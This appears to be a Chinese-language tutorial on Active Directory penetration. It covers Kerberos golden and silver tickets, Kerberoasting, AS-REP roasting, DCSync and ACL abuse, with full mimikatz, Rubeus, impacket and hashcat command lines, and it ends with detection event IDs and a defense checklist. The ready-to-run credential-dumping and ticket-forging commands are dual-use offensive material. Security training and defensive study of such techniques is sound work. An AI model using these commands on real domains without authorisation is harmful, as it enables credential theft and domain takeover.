# 域渗透与Kerberos攻击

## 概述

域渗透（Active Directory Penetration）是内网渗透的高级阶段。Windows域环境基于Kerberos认证协议，攻击者通过操纵Kerberos票据流和AD对象权限，实现权限维持、横向移动和域控接管。Kerberos攻击包括黄金票据、白银票据、Kerberoasting、AS-REP Roasting、DCSync和ACL滥用等。

## Kerberos认证协议

### 认证流程

```text
1. AS-REQ: 客户端向KDC（域控）发送认证请求，包含用户信息
   ↓
2. AS-REP: KDC验证用户密码（NTLM Hash），返回TGT（票据授权票据）
   └─ TGT使用KRBTGT账户Hash加密
   ↓
3. TGS-REQ: 客户端向KDC请求访问特定服务的票据
   └─ 包含TGT + 目标服务SPN
   ↓
4. TGS-REP: KDC验证TGT有效，返回服务票据（TGS）
   └─ TGS使用目标服务账户Hash加密
   ↓
5. AP-REQ: 客户端向目标服务提交TGS
   ↓
6. AP-REP: 服务端验证TGS有效，建立会话
```

### 关键组件

| 组件 | 说明 | 安全关注点 |
|------|------|-----------|
| KDC | 密钥分发中心（域控） | 控制所有票据签发 |
| TGT | 票据授权票据 | 证明用户身份的有效性 |
| TGS | 服务票据 | 访问特定服务的凭证 |
| KRBTGT | KDC服务账户 | 加密所有TGT的关键账户 |
| SPN | 服务主体名称 | 标识服务实例的唯一名称 |

## 黄金票据攻击

黄金票据攻击伪造KRBTGT账户签发的TGT，可冒充域内任意用户。

### 前提条件

- KRBTGT账户的NTLM Hash（或AES密钥）
- 目标域的SID（安全标识符）
- 目标域的名称

### 获取条件

```cmd
# 1. 域控权限获取KRBTGT Hash (通过DCSync)
mimikatz.exe "lsadump::dcsync /domain:target.local /user:krbtgt" exit

# 2. 或从域控内存提取
mimikatz.exe "privilege::debug" "sekurlsa::krbtgt" exit
```

### 黄金票据生成与使用

```cmd
# 使用Mimikatz创建黄金票据
mimikatz.exe "kerberos::golden /domain:target.local /sid:S-1-5-21-123456789-1234567890-123456789 /krbtgt:KRBTGT_HASH /user:Administrator /id:500 /ptt" exit

# 参数说明
# /domain: 目标域名
# /sid: 目标域SID（不含RID）
# /krbtgt: KRBTGT账户NTLM Hash
# /user: 伪造的用户名
# /id: 用户RID（500=内置管理员）
# /ptt: 直接注入当前会话

# 验证
klist
dir \\\\dc\\C$

# 使用Rubeus创建黄金票据
Rubeus.exe golden /domain:target.local /sid:S-1-5-21-xxx /aes256:AES256_HASH /user:Administrator /ptt
```

### 黄金票据检测

```text
# Event ID 4769 (TGS请求) 中无对应 4768 (TGT请求)
# TGT时间戳异常（非正常工作时间）
# TGT生命周期异常（默认10年）
# 用户登录时间与实际不符
# 推荐：监控Event ID 4768和4624的关联性
```

## 白银票据攻击

白银票据伪造特定服务的TGS，直接访问服务不需要KDC交互。

### 前提条件

- 服务账户的NTLM Hash（如MSSQLSvc、CIFS、HTTP等）
- 域SID
- 目标服务SPN

```cmd
# 创建白银票据（访问目标机器的CIFS服务）
mimikatz.exe "kerberos::golden /domain:target.local /sid:S-1-5-21-xxx /target:fileserver.target.local /service:cifs /rc4:SERVICE_HASH /user:Administrator /ptt" exit

# 使用白银票据访问文件共享
dir \\\\fileserver\\C$

# 其他服务类型
# /service:HOST - 远程计划任务/服务管理
# /service:HTTP - Web服务
# /service:MSSQLSvc - SQL Server访问
# /service:LDS - LDAP
# /service:WINRM - WinRM会话
```

### 白银票据 vs 黄金票据

- **黄金票据**: 伪造TGT，域内任意权限，易检测（与DC通信异常）
- **白银票据**: 伪造TGS，仅访问特定服务，不与DC通信，更难检测

## Kerberoasting

Kerberoasting攻击通过请求服务账户的TGS票据，离线破解服务账户的明文密码。

### 攻击步骤

```cmd
# 1. 查找有SPN的服务账户
setspn -T target.local -Q */*

# 2. 使用PowerShell请求服务票据
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql.target.local:1433"

# 3. 使用Mimikatz导出票据
mimikatz.exe "kerberos::list /export" exit

# 4. 使用Rubeus完成全流程
Rubeus.exe kerberoast /outfile:hashes.txt

# 5. 使用hashcat破解
hashcat -m 13100 hashes.txt wordlist.txt --force
```

### 高级Kerberoasting

```cmd
# Rubeus指定用户和加密方式
Rubeus.exe kerberoast /user:svc_sql /ticket:base64 /rc4opsec

# Impacket远程Kerberoasting
impacket-GetUserSPNs target.local/user:password -request -outputfile hashes.txt

# 针对特定用户的Kerberoasting
Rubeus.exe kerberoast /user:testuser /nowrap
```

## AS-REP Roasting

如果域用户未启用Kerberos预认证，攻击者可以请求该用户的AS-REP消息并破解其密码。

### 检测未启用预认证的用户

```cmd
# 使用PowerShell查询
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# 使用LDAP查询
ldapsearch -x -H ldap://dc.target.local -D "user@target.local" -W -b "dc=target,dc=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
```

### 攻击利用

```cmd
# Rubeus AS-REP Roasting
Rubeus.exe asreproast /outfile:asrep_hashes.txt

# Impacket
impacket-GetNPUsers target.local/ -usersfile users.txt -request -format hashcat -outputfile hashes.txt

# 破解AS-REP Hash
hashcat -m 18200 asrep_hashes.txt wordlist.txt --force
```

## DCSync攻击

DCSync模拟域控制器（DC）向其他DC请求复制域数据库，可获取所有用户的密码Hash。

### 权限要求

- 域管理员、企业管理员
- 域控本地管理员
- 有Replicating Directory Changes权限的用户

### 攻击利用

```cmd
# Mimikatz DCSync
mimikatz.exe "lsadump::dcsync /domain:target.local /user:krbtgt" exit
mimikatz.exe "lsadump::dcsync /domain:target.local /user:Administrator" exit
mimikatz.exe "lsadump::dcsync /domain:target.local /all" exit

# Impacket secretsdump
impacket-secretsdump target.local/user:password@dc.target.local

# 远程DCSync
impacket-secretsdump -just-dc target.local/user:password@dc.target.local
```

### DCSync检测

```text
# Event ID 4662: 对DS对象执行操作
# 操作类型：Replicating Directory Changes
# 源IP异常（非DC通信）
# 监控：非DC发起的目录复制请求

# 防御措施
# 1. 受保护用户组限制
# 2. 监控Event ID 4662
# 3. 限制Replication权限
# 4. 启用LAPS保护本地管理员
```

## ACL滥用

Active Directory中ACL（访问控制列表）配置不当可导致权限提升。

### 常见危险权限

| 权限 | 效果 | 利用方式 |
|------|------|----------|
| GenericAll 对用户 | 完全控制目标用户 | 重置密码，添加SPN |
| GenericWrite 对用户 | 修改属性 | 修改登录脚本 |
| WriteOwner | 修改所有者 | 变为所有者后提权 |
| WriteDACL | 修改ACL | 给自己加权限 |
| ForceChangePassword | 重置密码 | 不需要原密码 |
| AddMember | 添加组成员 | 加入管理员组 |

### 利用示例

```powershell
# 拥有对用户User1的GenericAll权限
# 重置其他用户密码
net user victim NewP@ss123 /domain
# 或使用PowerView
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString "NewP@ss123" -AsPlainText -Force)

# 使用Powerview枚举ACL
Get-ObjectAcl -ResolveGUIDs -Identity "Domain Admins" | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|Write|Create"}

# Sharphound收集ACL信息
SharpHound.exe -c ACL
```

## 域渗透防御

### 防御清单

- **受保护用户组**：将关键用户加入Protected Users组（禁止NTLM/委托）
- **最小特权原则**：严格管理委派和ACL权限
- **定期轮换KRBTGT密码**：重置两次KRBTGT密码以清除已签发票据
- **服务账户管理**：
  - 使用托管服务账户（gMSA）
  - 服务账户密码定期轮换
  - 限制服务账户SPN数量
- **监控关键事件**：
  - Event ID 4662: AD ACL更改
  - Event ID 4769: 服务票据请求
  - Event ID 4776: NTLM认证
  - Event ID 4688: 敏感进程创建
- **Honey Token**：设置虚假的易受攻击账户用于检测
- **LAPS**：保护本地管理员密码

### 检测工具

| 工具 | 用途 | 说明 |
|------|------|------|
| PingCastle | AD安全评估 | 自动分析AD风险配置 |
| BloodHound | 攻击路径分析 | 可视化AD关系图 |
| Purple Knight | AD安全检测 | 基于攻防矩阵的评估 |
| ADControl | 域控变更监控 | 实时监控AD敏感操作 |

## 参考资源

- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Active Directory Security](https://adsecurity.org/)
